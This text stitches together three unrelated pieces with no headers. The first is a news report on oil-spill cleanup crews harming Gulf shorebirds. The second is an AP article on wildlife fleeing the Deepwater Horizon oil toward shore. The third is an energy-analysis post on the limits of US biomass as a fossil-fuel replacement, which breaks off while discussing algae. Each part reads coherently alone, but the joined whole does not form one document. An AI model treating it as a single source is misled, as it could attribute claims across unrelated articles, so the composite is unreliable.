With so many people working so close to breeding grounds , frightened adult birds are abandoning their nests , and adults and chicks are being inadvertently trampled .
( See " Gulf Oil Spill Pictures : Ten Animals at Risk . " )
" Most of us know that the cleanup can do more damage than the oil could ever do , " said Riley Hoggard , a resource - management specialist for Gulf Islands National Seashore ( picture ) .
" Our bigger responsibility is to the [ wildlife ] , whether it's to a turtle nest or nesting shorebirds .
If we have to get cleanup teams off the beach , we 'll do that — and deal with the oil cleanup later . "
Birds Flushed , Cooked , Squashed During Cleanup
Oil on beaches is clearly a threat , since the toxic substance can affect shorebirds at all stages of their life cycles , Hoggard said .
( Read " Oil - Coated Gulf Birds Better Off Dead ? " )
An oil - contaminated egg could have a higher likelihood of not hatching .
And even if an egg does hatch , a curious chick could get mired in the sticky oil , which may kill the bird or hinder feather development , Hoggard said .
Deepwater Horizon Unified Command has sent assessment teams to monitor beaches and marshes and determine whether oil should be removed by hand — preferred in delicate regions such as the national seashore — or by heavy machines .
Each morning local conservation groups share information with BP 's cleanup supervisors about where nesting colonies exist , as well as cautions about not trampling , driving through , or otherwise encroaching on these areas .
But even with precautions in place , there have been instances of cleanup crews disturbing nesting colonies , noted Melanie Driscoll , director of bird conservation for the National Audubon Society 's Louisiana Coastal Initiative .
Eric Draper , executive director of Audubon of Florida , said many volunteers have inadvertently wandered into snowy plover nesting areas throughout the state .
" The responders ' activities have been more threatening to shorebirds than the oil itself , " Draper said .
Cleanup operations are most damaging when people " flush " nesting birds — frightening them enough to abandon their nests , the Gulf Islands ' Hoggard said .
Crews first dispatched to the Fort Pickens area of the national seashore flushed many shorebirds , and some colonies have abandoned their nests , he noted .
Even a temporary flush — when the parents are frightened off but return soon after — can be disastrous .
Without a parent 's belly to cool an egg , the embryo will literally get cooked in the Gulf Coast heat .
Likewise , predators such as seagulls may swoop in to snag an unprotected egg or chick .
Increased foot and vehicle traffic have also harmed bird parents and chicks .
Losing even one parent will doom a nest , Hoggard said , since it takes two to raise a chick : one to keep the egg cool and safe and another to search for food .
New , handmade signs on the national seashore 's main road implore drivers to watch out for skittering baby birds .
Even so , at least one chick was run over on Thursday , according to Adrianna Hirtler , a public information officer for the park .
Gulf Sand Dwellers Also at Risk From Cleanups
Florida Audubon 's Draper has begun recruiting volunteers in the state to act as " nesting - bird stewards , " keeping nests safe from nearby cleaning crews .
But even cleanup operations farther from nesting sites can pose threats to Gulf shorebirds , said Joel Kostka , a microbial ecologist at Florida State University in Tallahassee .
Standing on a sun-baked Pensacola ( map ) beach Friday , Kostka surveyed a wide , compacted crater made by heavy machines used to scrape away about a foot ( 0.3 meter ) of sand close to the water .
Such techniques clear away oiled sand , but they may also permanently harm sand - dwelling animals , which shorebirds prey on , Kostka said .
" People generally think about beach environments as being dead to biology , and that 's not at all the case , " Kostka said .
Sun -shy ghost crabs swarm Gulf beaches at night .
Small invertebrates such as mollusks and worms burrow in the sand , while thousands of microbe species feast on organic matter that the ocean washes ashore .
Members of these species may be killed outright by cleanup operations , and survivors are left with habitat that may never recover .
For instance , certain species adapted to one type of sand — say , coarser particles — may die off if another type of sand replaces the lost layers .
Rather than digging deep , Kostka said , beach cleaners should simply pick up and remove oiled sand from the surface , wherever possible .
There 's also a chance that in some cases doing nothing will be the best approach .
Natural forces — such as oil - munching microbes — will degrade some oil buried in beach sand , and scientists are now working to figure out how fast and how completely Mother Nature will clean up what 's there .
Gulf ecosystems were already in dire straits before the Deepwater Horizon oil spill , Kostka said .
Years of coastal development have wiped out large chunks of beach habitat , and sea - level rise linked to global warming threatens to inundate even more of the coastline , he said .

( AP ) -- Dolphins and sharks are showing up in surprisingly shallow water just off the Florida coast .
Mullets , crabs , rays and small fish congregate by the thousands off an Alabama pier .
Birds covered in oil are crawling deep into marshes , never to be seen again .
Marine scientists studying the effects of the BP disaster are seeing some strange phenomena .
Fish and other wildlife seem to be fleeing the oil out in the Gulf and clustering in cleaner waters along the coast in a trend that some researchers see as a potentially troubling sign .
The animals ' presence close to shore means their usual habitat is badly polluted , and the crowding could result in mass die - offs as fish run out of oxygen .
Also , the animals could easily be devoured by predators .
" A parallel would be : Why are the wildlife running to the edge of a forest on fire ?
There will be a lot of fish , sharks , turtles trying to get out of this water they detect is not suitable , " said Larry Crowder , a Duke University marine biologist .
The nearly two - month - old spill has created an environmental catastrophe unparalleled in U.S. history as tens of millions of gallons of oil have spewed into the Gulf of Mexico ecosystem .
Scientists are seeing some unusual things as they try to understand the effects on thousands of species of marine life .
Day by day , scientists in boats tally up dead birds , sea turtles and other animals , but the toll is surprisingly small given the size of the disaster .
The latest figures show that 783 birds , 353 turtles and 41 mammals have died - numbers that pale in comparison to what happened after the Exxon Valdez disaster in Alaska in 1989 , when 250,000 birds and 2,800 otters are believed to have died .
Researchers say there are several reasons for the relatively small death toll :
The vast nature of the spill means scientists are able to locate only a small fraction of the dead animals .
Many will never be found after sinking to the bottom of the sea or getting scavenged by other marine life .
And large numbers of birds are meeting their deaths deep in the Louisiana marshes where they seek refuge from the onslaught of oil .
" That is their understanding of how to protect themselves , " said Doug Zimmer , spokesman for the U.S. Fish and Wildlife Service .
For nearly four hours Monday , a three - person crew with Greenpeace cruised past delicate islands and mangrove - dotted inlets in Barataria Bay off southern Louisiana .
They saw dolphins by the dozen frolicking in the oily sheen and oil - tinged pelicans feeding their young .
But they spotted no dead animals .
" I think part of the reason why we 're not seeing more yet is that the impacts of this crisis are really just beginning , " Greenpeace marine biologist John Hocevar said .
The counting of dead wildlife in the Gulf is more than an academic exercise ; the deaths will help determine how much BP pays in damages .
As for the fish , researchers are still trying to determine where exactly they are migrating to understand the full scope of the disaster , and no scientific consensus has emerged about the trend .
Mark Robson , director of the Division of Marine Fisheries Management with Florida Fish and Wildlife Conservation Commission , said his agency has to find any scientific evidence that fish are being adversely affected off his state 's waters .
He noted that it is common for fish to flee major changes in their environment , however .
In some areas along the coast , researchers believe fish are swimming closer to shore because the water is cleaner and more abundant in oxygen .
Farther out in the Gulf , researchers say , the spill is not only tainting the water with oil but also depleting oxygen levels .
A similar scenario occurs during " dead zone " periods - the time during summer months when oxygen becomes so depleted that fish race toward shore in large numbers .
Sometimes , so many fish gather close to the shoreline off Mobile that locals rush to the beach with tubs and nets to reap the harvest .
But this latest shore migration could prove deadly .
First , more oil could eventually wash ashore and overwhelm the fish .
They could also become trapped between the slick and the beach , leading to increased competition for oxygen in the water and causing them to die as they run out of air .
" Their ability to avoid it may be limited in the long term , especially if in near - shore refuges they 're crowding in close to shore , and oil continues to come in .
At some point they 'll get trapped , " said Crowder , expert in marine ecology and fisheries .
" It could lead to die - offs . "
The fish could also fall victim to predators such as sharks and seabirds .
Already there have been increased shark sightings in shallow waters along the Gulf Coast .
The migration of fish away from the oil spill can be good news for some coastal residents .
Tom Sabo has been fishing off Panama City , Fla. , for years , and he 's never seen the fishing better or the water any clearer than it was last weekend 16 to 20 miles off the coast .
His fishing spot was far enough east that it was n't affected by the pollution or federal restrictions , and it 's possible that his huge catch of red snapper , grouper , king mackerel and amberjack was a result of fish fleeing the spill .
In Alabama , locals are seeing large schools hanging around piers where fishing has been banned , leading them to believe the fish feel safer now that they are not being disturbed by fishermen .
" We pretty much just got tired of catching fish , " Sabo said .
" It was just inordinately easy , and these were strong fish , nothing that was affected by oil .
It 's not just me .
I had to wait at the cleaning table to clean fish . "

In this post , the authors show that even if we can double current extraction of biomass , this only represents approximately 6 % of total U.S. primary energy consumption , and will likely never be enough to serve as a meaningful stabilizer in future energy systems .
Below the fold is the 3rd in a series of posts providing analysis ( and follow up ) on the difficulties of maintain our current energy paradigm with renewable energy ( generally , ' the fake fire brigade ' ) .
The main authors are Hannes Kunz , President of Institute for Integrated Economic Research ( IIER ) and Stephen Balogh , a PhD student at SUNY - ESF and Senior Research Associate at IIER .
IIER is a non-profit organization that integrates research from the financial / economic system , energy and natural resources , and human behavior with an objective of developing / initiating strategies that result in more benign trajectories after global growth ends .
The authors wrote over a 20,000 word follow - up to the questions raised in the original posting and we 've broken into 4 pieces for readability - the 2nd installment , with a focus on large scale biofuels , follows .
Biomass - A Panacea ?
In many resource discussions , biomass emerges as a solution that allows us to continue many activities currently powered by fossil fuels :
First , to move cars , trucks , machinery and planes when oil runs out or becomes too expensive .
Second , to provide flexibility in electric power generation , i.e. when other sources are stochastic and inflexible , biomass would provide the necessary gap - filling power .
Third , to heat our homes , after natural gas production declines .
There are many estimates of future uses for biomass , and many new technologies that are making their first baby - steps , quite a few of them promising and worth trying .
When we add up what biomass is projected to accomplish in the future , we quickly arrive at large numbers , which do n’t take into account the fact that extracting energy from solar flows is not something that can be easily scaled up at our discretion .
Below , we look at some key biomass technologies , and also spend some time attempting to put claims and reality into perspective .
Ultimately , there is no doubt we can produce some transportation biofuels , and little stands against burning wood or waste to generate heat and electricity , as many countries already do .
However , what we need to bear in mind is that these solutions will replace only a fraction of today ’s fossil fuels , and with far less flexibility .
Below , we try to present an overview of biomass as an energy source and its significant limitations in the bigger picture .
To do so , we look at a model of the total theoretical biomass potential for energy in the United States , and then compare a number of potential uses .
The U.S. is one of the world ’s least population dense areas with moderate and inhabitable climate , which provides significant biomass potential on a per-capita basis .
Europe , for example , has 3.6 times as many people per square kilometer when compared to the U.S. , so any biomass calculation for the “ old world ” looks significantly worse , even when factoring in that an average Western European country only consumes about 50 % of the primary energy per capita when compared to the U.S. ( EIA ) .
While we will look at the “ best case ” in the developed world today , Europe has its own history of biomass limits , which we now briefly explore .
The Middle Ages , a cautionary tale
At the end of the 13th century , Europe ’s forest coverage , as historic data sources show and isotopic analyses of sediments confirm , was as low as approximately 10 % of its total land mass .
Today , 38 % of the EU countries ’ surface is covered with forests , up from 25 % only 50 years ago .
At the same time , today ’s population in the EU - 27 countries stands at close to 500 million , whereas at the peak in medieval times ( between the years 1300 and 1350 ) , Europe was inhabited by 70 - 100 million people .
Back then , the continent was reaching its biophysical limits for supporting humans in a biomass - based economy , and after the last marginal spots of land were put to use for farming , there was little that could provide any more sources for food , fire and construction wood for a thriving and quickly growing society .
The discovery of fossil fuels and the New World were still things of the future .
A few poor harvests led to famines in the 14th century all across Europe , and when an already undernourished and thus weakened population was exposed to the black plague , Europe ’s population shrank by 35 - 50 % ( depending on sources ) within less than a century .
Things only improved once untapped resources in America were discovered , and new trade routes opened .
So clearly , back then , there was n’t enough sustainably growing biomass for a fraction of the people living today .
Crop yields a few centuries ago were equally only a fraction of today ’s , because many things known and available to us were n’t .
However , current yields – a result of ongoing research and innovation – are not just a product of science and better technology , but also come at the cost of additional energy inputs from ( mostly fossil - fuel driven ) fertilizers , minerals , pesticides , irrigation , equipment and other technology .
Thus , while human labor requirements in agriculture have fallen , net output increases in terms of “ energy content in food ” are much smaller after subtracting the fuels and embodied energy in the equipment used in modern agriculture .
Some authors even outright claim that when factoring all this in , agricultural outputs are energy negative , i.e. require more ( non-solar ) inputs than they generate in outputs ( Steinhardt and Steinhardt , 1974 )
How a plant cycle works
One of the key reasons why we were able to dramatically increase yields is the fact that we have been able to better understand how plants grow .
By comprehending this process and managing it properly , we are able to emulate nature ’s cycles while still extracting significant amounts of biomass for human purposes .
We do so by adding fertilizer and nutrients , providing enough water , by eliminating competition through herbicides and pesticides , and by focusing on high yields through breeding , hybridization and genetic modification .
To understand the scalability of biomass , understanding some of these basics helps , so we think .
“ Primary production ” is the term that describes the creation of new organic biomass from inorganic molecules , namely water and atmospheric ( or aquatic ) carbon dioxide .
In green plants , this is accomplished primarily through photosynthesis , and requires the presence of certain macro- and micro-nutrients .
We calculate net primary production by subtracting from gross primary production the energy lost to cellular respiration and maintenance metabolism .
Net primary production ( NPP ) , then , is the rate at which plants in an ecosystem transform diffuse solar energy into useful energy .
Some of this energy is used by the plant to grow and reproduce ; some energy is transferred to herbivores and omnivores in the ecosystem , when they eat plant biomass .
Terrestrial primary production varies based on many factors , chiefly insolation , temperature and precipitation .
There are 16 identified chemical elements essential to plant growth .
In addition to Carbon , Hydrogen and Oxygen available in air and water , macronutrients from the soil include Nitrogen , Phosphorus , Potassium , Calcium , Magnesium , and Sulfur .
Other nutrients are required also , though in much smaller amounts .
These micronutrients include Silicon , Manganese , Boron , Copper , Iron , Chlorine , Molybdenum , and Zinc .
Figure 1 : simplified nutrient cycle ( IIER )
In adequate conditions , plants grow to maturity , produce offspring , and then die .
Under most natural conditions , approximately 0.1 % of incoming solar energy is converted into biomass by plants , and 10 % of that is assimilated by higher level consumers .
The remainder of the plant biomass is shed as litter or returned to the ground when the plant dies .
Consumers that eat plants also return their nutrients to the ecosystem by excreting wastes and by their bodies decomposing after their death .
Decomposers in the soil ( bacteria , fungi , etc. ) consume this waste from plants and consumers and make these nutrients available for uptake again ( Figure 1 ) .
While all of the nutrients listed above are required for plant growth and respiration , plant growth is a function of the least available nutrient .
Liebig ’s Law of the Minimum states that if one of the nutritive elements required for plant growth is deficient or lacking , growth will be poor even when all the other factors are abundant .
Therefore , in an ecosystem with few losses to the environment outside its boundaries , nutrients are cycled efficiently through the system .
In an ecosystem where humans extract large amounts of biomass , however , nutrients can be drained from the soil at a rate greater than natural replenishment .
Over time , the quality of the soil degrades , and net primary production falls .
Below is an example of a more detailed nutrient cycle for nitrogen .
Figure 2 - Nitrogen Cycle ( Source : Wikimedia Commons )
It is therefore important to note that over time , land under agricultural production degrades because of permanent extraction from growing crops , erosion , and other factors .
A highly productive piece of farmland requires increasing fertilizer and mineral inputs to maintain high yields .
Similarly , yields can be raised even on lower - quality land by increasing the amount of fertilizers and minerals used .
However , this relationship is non-linear , and at high levels of fertilizer use the response becomes asymptotic .
Since the farmlands degrade over time due to nutrient depletion and erosion , any disruption in inputs would reduce yields to a level below the original yields obtained on the site without inputs ( Figure 3 ) .
In addition , the application of herbicides and pesticides can render the soil sterile and falling humus levels in the soil result in decreased soil moisture and contribute to soil erosion .
Figure 3 - Isopleths of Agricultural Yield .

It is relevant to understand that each human extraction of biomass , if not compensated by the return of an equal amount of nutrients , weakens the future potential and capacity of the land .
Ultimately , only ecosystems without human inputs and withdrawals arrive at relatively stable situations , where they operate at or close to a 100 % regeneration rate .
So simply put , if we plan to extract significant amounts of biomass , this will ultimately deteriorate the soil and affect future fertility of the land , unless we can replenish it .
There are multiple ways of replenishment , but all incur energy expensed elsewhere for those replenishments or slow the rate of extraction and make harvesting more complex ( fallow periods , frequent switch of plants , multi-plant environments ) .

United States Biomass Potential
The current extraction of biomass in the United States might provide some guidance regarding future potential .
A current practical maximum of sunlight conversion into biomass is approximately 1W / m2 on average per annum .
This translates to a maximum of 8.76 kWh ( 1 Watt x 365 days x 24 hours ) per square meter and year .
However , this is accomplished on prime land that is flat , low altitude , with sufficient insolation and water , with specific crops and with at least some fertilizers and technology use .
Therefore , assuming even half ( 0.5 W / m2 ) as an average is probably generous for any larger country , as many locations do n’t meet those ideal criteria due to elevation , weather , latitude , shades , absence of sufficient water , lower quality soils , etc .
A look at many sources , including a recent FAO documentation supports this assessment . )
For the United States , this assumption of 0.5W translates to a total energy capture of 29 ’ 765 TWh ( or 101.6 quadrillion BTU * ( short : quads ) for the continental U.S. for all cropland , forests and pasture areas .
For comparison , total oil consumption in the United States amounted to 41.4 quads in 2008 , and the country ’s total energy use was 99.4 quads .
In 2009 , total energy consumption in the U.S. was down to 94.6 quads , mostly related to the recession .
So ultimately , what is theoretically possible to be annually produced as biomass from U.S. land almost exactly equals today ’s total energy consumption .
* The assumption of 0.5 W/m2 and a theoretical maximum production of 100 quads is significantly higher than available in other scientific publications .
Biomass uses
When looking at the above theoretical maximum of slightly above 100 quads , there are quite a number of uses for this biomass :
Food for humans
Nutrients and habitat for all wildlife ( wild and domestic feed too )
Soil regeneration ( crop residuals are the basic ingredient )
Other ecosystem services ( carbon fixation , soil stabilization , etc. )
Cellulose for construction material , paper production and other cellulosic material uses
In the future , others have proposed to use more biomass for the following purposes :
Biofuels ( Ethanol , Biodiesel )
Cellulose for non-oil based plastic materials
Electricity production ( peak load and balancing of other renewable sources )
Direct space heating
To understand the feasibility of this objective , and the scale at which this is possible , it is useful to look at aggregate numbers from an ecosystems perspective .
Current biomass extraction
In 2008 , total agricultural biomass outputs ( including animal feed and base for fuel production , excluding forests ) equaled to approximately 6.6 quadrillion BTU ( quads ) .
This calculation is based on the energy content in retrieved crops , where quantities can be found in the FAO ’s agricultural database .
Of those , approximately 20 % ( 1.4 quads , mostly from corn ) went into biofuels , producing fuel with an energy content of about 640 trillion BTU in the form of ethanol and biodiesel ( using additional energy inputs from fossil fuels ) .
Additionally , in a meat - intensive society like the U.S. , a significant portion of agricultural biomass ( approximately 2.9 quads or 44 % ) is used as animal fodder .
On top of that , animals feed from pasture land , which – at a relatively low conversion efficiency , but with very limited inputs – indirectly adds another 1.8 quads to the human food chain .
Together , these 4.7 quads produce about 570 trillion BTU ( 0.57 quads ) of annual animal products ( meat , milk , eggs , cowhides , etc. ) .
It is difficult to estimate the total quantities extracted from pasture land through grazing and haying , but as the above calculation translates into an 8:1 conversion ratio between fodder input and animal protein output , it seems reasonable .
It is important to note that a significant part of the pasture land is n’t feasible for other uses , due to soil quality , insufficient water availability , topography , or size .
On top of that , about 0.1 quad goes towards other uses ( tobacco , fabrics ) , so ultimately , from all arable land , about 2.2 quads are processed for human food directly , supplemented with another 0.6 quads from animals , and about 0.02 quads ( 20 trillion BTU ) of biomass extracted from water bodies ( fresh - and saltwater ) , which we will ignore due to its insignificance .
From U.S. forests , about 300 million dry metric tons of wood and byproducts with an energy content of approximately 5 quads were removed in 2008 ( derived from FAO data ) .
Of these , a significant portion of approximately 2 quads ( EIA ) went into energy production , mostly in the form of waste from saw mills , paper production and others already , which already today get mostly converted into electricity or process heat – in most cases providing the energy to process the wood and its by - products .
Table 1 : Biomass extraction in the U.S .
So in summary , Americans extract approximately 13 % of the gross biomass potential of the country , of which we ultimately use about 9 % , after converting a significant portion to animal protein .
Other sources say that this extraction is closer to 25 % of total land potential on a global scale , so we might be too optimistic about the initial potential .
Figure 4 : U.S. biomass outputs ( 2008 )
Energy input requirements
Agriculture and forest use have been areas of high innovation during the past decades .
If not for the “ green revolution ” , which included the optimized use of fertilizers , pesticides and hybrid or genetically modified “ designer ” crops , we would n’t be able to feed almost 7 billion humans on Planet Earth the way we do today .
Together , those human biomass extractions amount to between 9 % ( net ) and 13 % ( gross ) of the already generously calculated maximum of 100 quads of total annual biomass production in the U.S.
All this is accomplished after a few thousand years of trial and error , with most of the gains in the past century from the application of inputs based on fossil fuels .
Therefore , the above numbers do not include the significant energy inputs into extracting those 13.4 quads of gross output .
Should we have to provide external energy inputs mostly from biomass , it would further reduce net outputs .
We have only limited knowledge about the exact ratio , but there are some indications .
Pimentel ( 2007 ) calculates an EROI of 4:1 for corn ( the crop itself , not the ethanol product ) .
A 2004 estimate by the Congressional Research Service , estimated that 1.7 quads of inputs are required to produce the agricultural part of the biomass ( 6.6 quads gross , or 4.3 quads net after conversion to animal protein ) .
The latter results in a similar net energy return ratio ( EROI ) of 3.9:1 ( gross , generously ignoring pasture ) or 2.5 ( net , after conversion of fodder to animal protein ) .
Net energy extraction from biomass
All energy we use can be initially measured as primary energy .
To do so , we count the raw energy content of each source contribution to our energy systems .
The concept of primary energy allows us to compare what would otherwise be “ apples and oranges ” .
For example , 1 kWh of directly usable electricity produced from hydropower is counted exactly the same as 3 ’413 BTUs ( equivalent to 1 kWh ) of theoretical heat value in coal , which has to be converted to something useful like process heat or electricity at a loss .
To continue with this example , if we had to replace 1 kWh of hydro - powered electricity with coal , we would have to use 3 kWh of embodied energy in coal , converting it to electricity in a power plant with a typical 33 % efficiency .
So in order to serve the same purpose ( in this case electricity ) , we would need three times as much coal to make the final amount of electricity available to society .
This brings us to one of the key problems of biomass , which does n’t just apply for uses in agriculture : when it comes to primary energy content , we need more primary energy per unit of usable energy from biomass relative to equivalent fossil fuel based energy .
The key reason for this is because biomass undergoes a lower conversion efficiency when turned into the energy forms we want to use ( electricity , transportation fuels , etc ) , due to its low energy density , its state ( solid , not fluid or gaseous ) – both of which lower the effectiveness of converting the primary energy into usable fuels .
Table 2 : Energy density and conversion efficiency of multiple materials
This translates to a different energy delivery profile ( lower heat , less flexibility ) , and thus lower overall efficiency .
The only place where biomass achieves a relatively good result is in heating , where relatively low temperatures are required .
However , bringing biomass into individual buildings would require major refitting , which will reduce overall efficiency again .
To arrive at useful energy inputs , these original biomass inputs undergo a conversion , which creates significant losses .
On average , many of those biomass - to - useful - energy conversion processes operate at efficiencies between 30 and 50 % to arrive at the desired energy quality that is on par with comparable fossil fuels ( coal , oil , natural gas ) .
Below , we present a few approximate conversion efficiencies for multiple technologies and compare them with traditional pathways to produce the same final output .
All examples are gross conversion efficiencies , not taking into account the energy used in the equipment , which mostly is more complex for biomass .
Table 3 : Penalties for desired biomass solutions ( IIER )
In order to understand possible consequences , we applied the lower efficiencies of biomass conversion to gross consumption of fossil fuels in the U.S. in 2008 , based on end use .
Approximately 143 quads of biomass are required to replace the 83.34 quads of primary energy consumption of fossil fuels – coal , natural gas and crude oil ( Table 4 ) .
This handicap is not due to lack of appropriate technology , but simply related to the chemical properties of the materials involved , e.g. state ( solid , fluid , gaseous ) and energy density of the different sources .
With significant shifts to better pathways , for example by heating more homes with wooden biomass directly , we might improve the situation slightly , but never fully , and always at the cost of significant technology investment .
Table 4 : Estimation of gross biomass needed to replace the useful energy from fossil fuels
Reality - check – how would self - sustained energy from biomass look ?
If we take the more generous EROI ratio for biomass ( 3.9:1 ) and assume that the ratio remains unchanged when scaling to higher levels of biomass extraction , we can estimate how much biomass would be required to produce the same ( or more ) outputs from biomass in a self - sustained system where farms produce their own energy .
In order to use biomass to provide the power to grow and harvest additional biomass , we also need to convert it into a usable form , e.g. to run a tractor , we need Biodiesel or Ethanol , to produce fertilizer we would require methane and or hydrogen , to mine and process nutrients , we would need fuels and electricity , and so on .
Thus , when looking at the 6.6 quads of total biomass from crops , an additional 1.7 quads of energy inputs would – at a 50 % conversion rate – actually require 3.4 quads of agricultural biomass as primary input .
So in that gross input model , for each net unit of energy extraction , input worth 0.51 units would be required .
Table 5 - gross energy requirements for agricultural output when energy is self - provided
Figure 5 : U.S. cropland biomass outputs and energy input requirements
It is probably fair to assume that forest related extraction is slightly less energy - intensive , maybe operating at 5:1 for the gross energy retrieved .
Inputs to forestry include : management expenditures , planting new trees , harvesting , and transporting removed biomass .
In this case , assuming a 40 % efficiency of converting cellulosic biomass into useful input energy ( which is very ambitious ) , we would need 0.5 energy units for each final unit of energy extracted ( 0.2 fossil fuel inputs for each unit of final wood biomass would require 0.5. raw units of biomass before conversion to useful energy ) .
These examples show that a re-introduction of a biomass - based society will likely use a significant amount of the biomass itself in order to steadily reproduce the same quantities .
Future extraction potential
One indication of how much biomass could be extracted comes from an otherwise very optimistic renewable energy study conducted in 2000 by Pimentel et.al .
where the authors assume that total biomass extraction for energy could be grown to 5 quadrillion BTU in 2050 , about 50 % above today’s .
However , other scientists and energy planners believe that today ’s achievement of diverting about 10 % of the annually generated biomass to human use can be easily doubled , tripled or quadrupled within a few decades .
One of the most ambitious estimates was published in a combined study by the Department of Energy and the U.S. Department of Agriculture in 2005 .
This study assumes that the U.S. would be able to sustainably produce gross 1,366 million tons of dry biomass per annum available for energy purposes by 2030 .
This quantity would amount to 23.5 quadrillion BTU , or ¼ of current U.S. energy needs , about 23 % of the theoretical maximum biomass net production .
To our knowledge , this is the most ambitious estimate available ; most others suggest various fractions of it .
When adding current uses for food and industry , total extraction would amount to almost 37 quads , or 35 % of total maximum potential .
This means that we are to triple our biomass extraction from nature within a few decades .
Below , using these estimates , we build what we consider an optimistic model for the United States where biomass is produced with a generous input to output conversion ratio of 5:1 for biomass production ( not including solar radiation ) , assuming future technology improvements from today ’s levels .
Then , the part of outputs going back into the production of biomass needs to be refined and converted to its final use ( such as methane for fertilizer production , fuels for machinery , feedstock for electricity ) , which we assume will happen at an average conversion rate of 50 % .

The above calculation shows that in order to net 32.8 quads worth of food and energy within those two decades we would have to extract almost 50 % of the total annual U.S. biomass production for human use , compared to approximately 10 % today .
This is not something we consider feasible .
Figure 6 : Energy output from biomass in 2030 DOE / USDA scenario
We could go into further detail regarding those projections , for example analyzing the assumption made in the above EIA / USDA paper that we can safely remove about 2.6 % of all biomass from forests every year without adversely impacting the ecosystem ( current removal rates are at around 1.5 % in the U.S. ) .
Knowing that even the fastest growing pine plantations have a cycle time of 30 - 35 years , and other trees around twice that much , makes this objective of extracting an average forest ’s biomass every 38 years ambitious .
These projections also ignore events like forest fires , pests , droughts , and other things leading to bad crop years .
All in all , it seems highly unlikely that we will be able to triple our output and divert almost 50 % of total annual potential U.S. biomass production towards humans .
Particularly since we know that this system is built on a cycle , which in the long run expects almost the same input as it produces .
One potential elephant in the biomass room – Phosphorus
Phosphorus is one of the key macronutrients required for plant growth .
Unlike other limiting nutrients , phosphorus may be the most difficult to replace .
It cannot , irrespective of crop , be fixated locally , and is relatively rare .
To maintain or increase yields , we must replenish the soil with phosphates whenever we extract biomass .
Phosphates are required by almost all species – not just plants – to build DNA , and if it ’s absent , yields shrink relatively quickly .
Unfortunately , of all the ingredients needed for plant growth , phosphate rock is the one with the smallest amount of known reserves globally , which are geographically concentrated to just a few places on earth .
Currently , phosphorus , which is mined in the form of phosphate - bearing rock , has known reserves of about 16 billion metric tons worldwide ( USGS ) , which represents about 100 years of current use .
However , already now , the “ half - empty glass ” problem becomes increasingly visible , as phosphorus content of mined phosphate rock is decreasing rapidly , and prices are going up accordingly .
Some people are talking about “ peak phosphorus ” within less than 30 years , but again , this is a moving target , depending on exploration and effort .
But what is clear is that phosphorus , once it becomes scarce , will become more , and potentially very expensive to extract .
2008 provided a brief glimpse of what a world of limited phosphorus could look like .
Shortly before the economic crisis hit , phosphate rock prices rose from $ 30 - 40 to 400 $ / metric ton within less than one year .
With the crisis , they came back down to about 70 - 80 $ , still twice as much as before the increase .
If we plan on extracting two or three times as much biomass from our soils , one would expect that we will have to increase phosphorus use .
So in order to produce those 32.8 quadrillion BTU , we likely would need three times as much phosphorus as today , which will pull the end of easily accessible phosphorus closer , maybe as close as 10 or 20 years .
This leads us to the conclusion that our current agricultural systems are n’t as “ renewable ” as they may seem .
True potential and technologies
After covering the entire system ’s potential , we see only limited opportunity for any significant biomass output growth .
However , current plants used for ethanol production are n’t ideally optimized for inputs ( a vast majority in the U.S. is corn ) , which has led to the discussion of replacing them with other plants with better growth profiles .
Among them are a number of perennial grasses , like Miscanthus , or switchgrass , which both produce cellulosic biomass .
Sugar cane , the key energy crop used in Brazil , which produces high shares of carbohydrates , unfortunately does n’t grow in most U.S. regions due to its need for high moisture levels and temperatures .
Importantly , these grasses ( as is sugarcane ) are capable of fixating nitrogen directly ( due to bacteria in their own rhizome ) , which greatly reduces nitrogen fertilizer needs .
In addition , they produce – under ideal circumstances – biomass output close to the aforementioned 1 Watts per square meter .
The downsides are that the produced biomass is cellulosic , which requires a much more difficult - to - manage fermentation ( or gasification ) process to turn it into a useful combustion fuel like ethanol or biodiesel .
As of yet , no meaningful and scalable processes have emerged with decent conversion efficiency .
What works is to burn cellulose for the generation of heat and electricity , which is the predominant use of wood residuals , but even there , conversion efficiency is low , particularly for electricity .
Within biomass for energy , we basically look at three types , with different characteristics : lipids ( oils ) , carbohydrates ( sugars , starch , etc. ) and cellulosic materials ( wood ) .
They are different in their chemical structure , and come from different parts of plants .
As humans ca n’t digest cellulosic biomass ( unlike cattle ) , our food mostly consists of lipids , carbohydrates and proteins .
Humans utilize grazing animals to convert cellulose to usable biomass in the form of milk and meat .
In order to understand the potential of biomass further , it is worthwhile looking at the potential of each plant category .
We wo n’t go too much into detail , but do provide an overview .
In the table below we show the characteristics of each group and their usefulness for energy crops .
Table 7 - Characteristics and feasibility of various crops .
The fact that cellulose is so hard to “ digest ” into something that is useful as a liquid fuel , led to a focus on biofuels that either come from lipids ( Biodiesel ) or carbs ( Ethanol ) .
The generation of cellulosic ethanol proves to be much more complex and energy - intensive when compared to fermenting ethanol from carbohydrates , which is the key route taken today in the U.S ( mostly from corn ) and Brazil ( mostly from sugarcane , where the bagasse also provides the process heat from its cellulosic material ) .
Algal biomass ?
There are several reasons that algae are seen as a promising future source of renewable energy , especially as a source of biofuels .
First , algae grow at a high conversion efficiency ( theoretically up to 4 W / m2 ) , with a large share ( up to 60 % of total mass ) of easy - to - process lipids and proteins .
Unlike corn ethanol , sugar cane , and any energy crop that requires higher quality arable land to grow , algae can minimize or avoid competition with food crops .
Many plans involve using desert locations to maximize sunlight use .
Also , algae can use waste water and saline water inputs and can be fed from stationary sources of CO2 , turning sources of waste ( such as carbon - or natural gas - fueled power plants ) into energy and recycling carbon emissions ( DOE 2010 ) .
The problem with algal fuels is that their production has never moved beyond small scale trials ( relative to consumption ) , so scalability is still an unchecked issue .
One might think that this is normal with a brand - new technology , however , it seems important to note that – like most other things discussed as alternatives today – the concept of turning algae into fuel is not a new one .
Research began as far back as the 1950s , but did not gather true momentum until the first oil shock of the 1970s , when the U.S. government funded the largest research program related to algal biomass , which ran from 1978 to 1996 ( the Aquatic Species Program ) .
The results were disappointing , with open pond systems often failing due to the starting strain of microalgae being overgrown by other , less energy - producing species that contaminated the pond .
Open ponds , particularly in places with high insolation , also require massive amounts of water .
A hectare sized cultivation system can require 2 million liters of water ( 530,000 gallons ) to fill and around 50,000 liters a day to replace evaporative losses ( DOE 2010 ) .
Since most of the evaporation is pure water ( H2O ) only , the pool cannot be endlessly replenished with wastewater , because this would slowly increase concentration of toxins and other materials in the pond .
Providing freshwater , on the other hand , is energy - intensive , particularly in the locations where insolation is high .
These are some of the reasons why things have n’t worked out so far .
None of the companies suggesting open - pond systems seem to have answers to this problem , and to us , it looks like one that does n’t yet have a solution .
